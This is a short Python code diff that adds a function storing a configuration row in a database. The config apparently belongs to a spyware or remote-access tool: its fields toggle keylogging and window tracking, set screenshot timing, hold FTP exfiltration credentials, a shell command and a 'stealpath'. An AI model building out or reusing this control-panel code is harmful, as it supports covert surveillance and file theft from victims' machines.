@@ -39,3 +39,11 @@ def get_config(cursor):
 def clear_config(cursor):
     query = ''' DELETE FROM config'''
     cursor.execute(query)
+
+
+@connection_handler
+def add_config(cursor, config):
+    clear_config()
+    query = ''' INSERT INTO config (debug, "keyloggingIsActive", "windowTrackingIsActive", samplingfrequency, screenshotfrequency, screenshottrigger, baseurl, communicationfrequency, ftpurl, ftpusername, ftppassword, shellcommand, stealpath)
+                VALUES(%(debug)s, %(keyloggingIsActive)s, %(windowTrackingIsActive)s, %(samplingfrequency)s, %(screenshotfrequency)s, %(screenshottrigger)s, %(baseurl)s, %(communicationfrequency)s, %(ftpurl)s, %(ftpusername)s, %(ftppassword)s, %(shellcommand)s, %(stealpath)s)'''
+    cursor.execute(query, config)
